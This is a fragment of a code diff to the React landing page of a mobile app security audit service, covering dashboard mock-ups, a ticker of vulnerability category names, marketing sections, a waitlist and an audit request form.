+                    </svg>
+                    <span className="pw-spark-n">32 findings · 18 confirmed</span>
+                  </div>
+                  <div className="pw-recent">
+                    <div className="pw-recent-h">Recent activity</div>
+                    {activity.map((a, i) => (
+                      <div className="pw-act" key={i}><span className="pw-act-dot" /><span className="pw-act-t"><b>{a.who}</b> {a.what}</span><span className="pw-act-w">{a.when}</span></div>
+                    ))}
+                  </div>
+                </>
+              )}
+
+              {pwView === 'coverage' && (
+                <>
+                  <div className="pw-crumb">Coverage<span>›</span>com.acme.wallet</div>
+                  <div className="pw-cov-top">
+                    <div className="pw-cov-big"><b>62<span>%</span></b><span className="pw-cov-lbl">coverage</span></div>
+                    <div className="pw-cov-sum"><b>19 of 31 surfaces probed</b><span>164 cells across static, dynamic, network, storage, and native</span></div>
+                  </div>
+                  <div className="pw-cov-list">
+                    {coverageSurfaces.map((s) => (
+                      <div className="pw-cov-row" key={s.name}>
+                        <span className="pw-cov-name">{s.name}</span>
+                        <span className="pw-cov-bar"><i style={{ width: s.pct + '%' }} /></span>
+                        <span className="pw-cov-pct">{s.pct}%</span>
+                      </div>
+                    ))}
+                  </div>
+                </>
+              )}
+
+              {pwView === 'devices' && (
+                <>
+                  <div className="pw-crumb">Devices<span>›</span>1 connected</div>
+                  <div className="pw-dev">
+                    <div className="pw-dev-head"><span className="pw-live" aria-hidden="true" /><b>Pixel 6a</b><span className="pw-dev-os">Android 14</span></div>
+                    <dl className="pw-props">
+                      <div><dt>Status</dt><dd><span className="pw-open ok" />Connected</dd></div>
+                      <div><dt>Transport</dt><dd>adb · USB</dd></div>
+                      <div><dt>Instrumentation</dt><dd>Frida 17.x · running</dd></div>
+                      <div><dt>Serial</dt><dd>2A12…8312</dd></div>
+                      <div><dt>Trust</dt><dd>rooted · CA installed</dd></div>
+                    </dl>
+                    <div className="pw-dev-note">The engine drives a real handset. Every dynamic finding is reproduced here, then captured as evidence.</div>
+                  </div>
+                </>
+              )}
             </div>
           </div>
         </div>
         <div className="ticker" aria-hidden="true"><div className="ticker-track"><span>DEEPLINK → WEBVIEW TOKEN EXPOSURE · CONFIRMED</span><span>EXPORTED ACTIVITY INTENT REDIRECTION · PROVEN</span><span>JS BRIDGE @JavascriptInterface TOKEN READ · CONFIRMED</span><span>CLIENT-STATE AUTH BYPASS · REPRODUCED</span><span>FIREBASE RTDB OPEN WRITE · PROVEN</span><span>NATIVE JNI OVERFLOW · CRASH REPRODUCED</span><span>DEEPLINK → WEBVIEW TOKEN EXPOSURE · CONFIRMED</span><span>EXPORTED ACTIVITY INTENT REDIRECTION · PROVEN</span><span>JS BRIDGE @JavascriptInterface TOKEN READ · CONFIRMED</span><span>CLIENT-STATE AUTH BYPASS · REPRODUCED</span><span>FIREBASE RTDB OPEN WRITE · PROVEN</span><span>NATIVE JNI OVERFLOW · CRASH REPRODUCED</span></div></div>
       </section>
 
-      <section className="approach section-pad dark-section" id="approach"><div className="section-heading"><p className="section-kicker lime-text">How we work</p><h2>Evidence over<br /><span>assumptions.</span></h2><p className="heading-note">Every finding comes with a proof, a path, and a practical next step. No theater. No mystery.</p></div><div className="service-list">{services.map((service) => <article className="service-item" key={service.number}><span className="service-number">{service.number}</span><div><h3>{service.title}</h3><p>{service.text}</p></div><span className="arrow">↗</span></article>)}</div></section>
-
-      <section className="scope section-pad" id="scope"><div className="scope-intro"><p className="section-kicker">Built for mobile reality</p><h2>One audit.<br /><span>Clear signal.</span></h2><p>The autonomous engine maps your app against OWASP MASVS and the Mobile Top 10, then chains findings toward real impact. On a known ground-truth benchmark it found 18 of 18 planted issues.</p></div><div className="scope-grid"><div className="scope-card featured-scope"><span className="card-label">01 / COVERAGE</span><strong>iOS<br /><span>&</span> Android</strong><span className="card-line">Native, hybrid, and cross-platform</span></div><div className="scope-card"><span className="card-label">02 / OUTPUT</span><strong>Findings<br />that land.</strong><span className="card-line">Severity, evidence, reproduction, fix.</span></div><div className="scope-card scope-note"><span className="card-label">03 / STANDARD</span><strong>MASVS<br />ALIGNED</strong><span className="card-line">A rigorous baseline. Not a ceiling.</span></div></div></section>
+      <section className="chains section-pad dark-section" aria-label="Proven chains">
+        <div className="section-heading"><p className="section-kicker lime-text">[ Proven chains ]</p><h2>Not signals.<br /><span>Reproductions.</span></h2><p className="heading-note">A signal is a guess. The engine chains primitives to real impact and proves it on a device. A shape of what it finds.</p></div>
+        <div className="chains-grid">{chains.map((c, i) => <article className="chain-card" key={i}><div className="chain-top"><span className="chain-tag">{c.tag}</span><span className="chain-outcome">{c.outcome}</span></div><p>{c.text}</p></article>)}</div>
+      </section>
 
       <section className="early-access section-pad dark-section" id="early-access">
-        <div className="section-heading"><p className="section-kicker lime-text">Early access / cohort 01</p><h2>The engine is running.<br /><span>Get your app in front of it.</span></h2><p className="heading-note">We onboard a handful of mobile teams at a time, engineer to engineer. You bring a release candidate, the engine brings the adversarial hours, and a researcher signs off every finding before it reaches you.</p></div>
-        <div className="waitlist-panel">
+        <div className="ea-inner">
+          <p className="section-kicker lime-text">[ Early access · cohort 01 ]</p>
+          <h2>The engine is running.<br /><span>Get your app in front of it.</span></h2>
+          <p className="ea-lede">We onboard a handful of mobile teams at a time, engineer to engineer. You bring a release candidate; a researcher signs off every finding before it reaches you.</p>
           {waitDone ? (
             <div className="waitlist-done"><span className="success-mark">✓</span><div><b>You&apos;re on the list.</b><span>We&apos;ll reach out with an onboarding slot. One email, nothing else.</span></div></div>
           ) : (
@@ -319,11 +576,21 @@ export default function Page() {
               {waitError && <p role="alert" className="waitlist-error">{waitError}</p>}
             </form>
           )}
-          <div className="waitlist-meta"><span>One email to schedule a slot. Nothing else.</span><span>Live demo on your own build.</span><span>Latest benchmark write-up included.</span></div>
+          <div className="ea-meta"><span>One email to schedule a slot</span><span>Live demo on your own build</span><span>Benchmark write-up included</span></div>
         </div>
       </section>
 
-      <footer className="footer"><div className="footer-brand"><a className="brand" href="#top"><span className="brand-mark">ox</span>droid<span className="brand-dot">.</span></a><p>Mobile security for<br />what&apos;s next.</p></div><div className="footer-links"><div><span>Explore</span><a href="#approach">Approach</a><a href="#scope">Scope</a><a href="#early-access">Early access</a><a href="/privacy">Privacy policy</a><a href="/blogs">Journal</a></div><div><span>Say hello</span><a href="mailto:support@oxdroid.io">support@oxdroid.io</a><a href="https://github.com/oxdroid" target="_blank" rel="noreferrer">GitHub ↗</a><a href="https://www.linkedin.com/company/oxdroid" target="_blank" rel="noreferrer">LinkedIn ↗</a><a href="https://twitter.com/oxdroid" target="_blank" rel="noreferrer">Twitter ↗</a></div></div><div className="footer-bottom"><span>© 2026 oxdroid security lab</span><span>Built for the brave.</span></div></footer>
+      <section className="approach section-pad dark-section" id="approach"><div className="section-heading"><p className="section-kicker lime-text">How we work</p><h2>Evidence over<br /><span>assumptions.</span></h2><p className="heading-note">Every finding comes with a proof, a path, and a practical next step. No theater. No mystery.</p></div><div className="service-list">{services.map((service) => <article className="service-item" key={service.number}><span className="service-number">{service.number}</span><div><h3>{service.title}</h3><p>{service.text}</p></div><span className="arrow">↗</span></article>)}</div></section>
+
+      <section className="scope section-pad" id="scope"><div className="scope-intro"><p className="section-kicker">Built for mobile reality</p><h2>One audit.<br /><span>Clear signal.</span></h2><p>The autonomous engine maps your app against OWASP MASVS and the Mobile Top 10, then chains findings toward real impact. On a known ground-truth benchmark it found 18 of 18 planted issues.</p></div><div className="scope-grid"><div className="scope-card featured-scope"><span className="card-label">01 / COVERAGE</span><strong>iOS<br /><span>&</span> Android</strong><span className="card-line">Native, hybrid, and cross-platform</span></div><div className="scope-card"><span className="card-label">02 / OUTPUT</span><strong>Findings<br />that land.</strong><span className="card-line">Severity, evidence, reproduction, fix.</span></div><div className="scope-card scope-note"><span className="card-label">03 / STANDARD</span><strong>MASVS<br />ALIGNED</strong><span className="card-line">A rigorous baseline. Not a ceiling.</span></div></div></section>
+
+      <section className="safety section-pad dark-section" aria-label="Safety">
+        <div className="section-heading"><p className="section-kicker lime-text">[ Safety ]</p><h2>Aggressive testing.<br /><span>Zero blast radius.</span></h2><p className="heading-note">All the findings of a real attack, none of the fallout. These are invariants of the engine, not promises.</p></div>
+        <div className="safety-grid">{safety.map((s, i) => <article className="safety-card" key={i}><span className="safety-n">{String(i + 1).padStart(2, '0')}</span><h3>{s.title}</h3><p>{s.text}</p></article>)}</div>
+        <p className="safety-note">MASVS-aligned · responsible testing · your app is never used to train a model</p>
+      </section>
+
+      <footer className="footer"><div className="footer-brand"><a className="brand" href="#top"><span className="brand-mark">ox</span>droid<span className="brand-dot">.</span></a><p>Mobile security for<br />what&apos;s next.</p></div><div className="footer-links"><div><span>Explore</span><a href="#approach">Approach</a><a href="#scope">Scope</a><a href="#early-access">Early access</a><a href="/privacy">Privacy policy</a><a href="/blogs">Journal</a></div><div><span>Say hello</span><a href="mailto:support@oxdroid.io">support@oxdroid.io</a><a href="https://github.com/oxdroid" target="_blank" rel="noreferrer">GitHub ↗</a><a href="https://www.linkedin.com/company/oxdroid" target="_blank" rel="noreferrer">LinkedIn ↗</a><a href="https://twitter.com/oxdroidlab" target="_blank" rel="noreferrer">Twitter ↗</a></div></div><div className="footer-bottom"><span>© 2026 oxdroid security lab</span><span>Built for the brave.</span></div><div className="footer-wordmark" aria-hidden="true">oxdroid</div></footer>
 
       {modalOpen && <div className="modal-backdrop" role="presentation" onMouseDown={(event) => { if (event.target === event.currentTarget) { setModalOpen(false); setFormError('') } }}><div className="audit-modal" role="dialog" aria-modal="true" aria-labelledby="modal-title"><button className="modal-close" aria-label="Close request form" onClick={() => { setModalOpen(false); setFormError('') }}>×</button>{submitted ? <div className="success-state"><span className="success-mark">✓</span><p className="section-kicker lime-text">Message received</p><h2>Let&apos;s make<br />it <span>harder.</span></h2><p>We&apos;ll be in touch shortly to understand your app, your release, and where you need signal most.</p><button className="button button-lime" onClick={() => { setModalOpen(false); setSubmitted(false); setFormError('') }}>Back to site</button></div> : <><p className="section-kicker lime-text">Start a conversation</p><h2 id="modal-title">Request an<br /><span>audit.</span></h2><form onSubmit={submitAudit}>{/* Honeypot: hidden from humans, bots fill it automatically */}<input type="text" name="_honey" defaultValue="" aria-hidden="true" tabIndex={-1} autoComplete="off" style={{ position: 'absolute', left: '-9999px', opacity: 0, height: 0, width: 0, pointerEvents: 'none' }} /><label>Name<input required name="name" placeholder="Your name" /></label><label>Work email<input required type="email" name="email" placeholder="you@company.com" /></label><label>Tell us about the app<textarea required name="message" placeholder="What are you building?" rows={3} /></label>{formError && <p role="alert" style={{ color: '#c0392b', fontFamily: 'var(--font-mono)', fontSize: '11px', margin: '0', lineHeight: '1.5' }}>{formError}</p>}<button className="button button-lime" type="submit" disabled={loading}>{loading ? 'Sending request...' : <>Send request <span>↗</span></>}</button></form></>}</div></div>}
     </main>
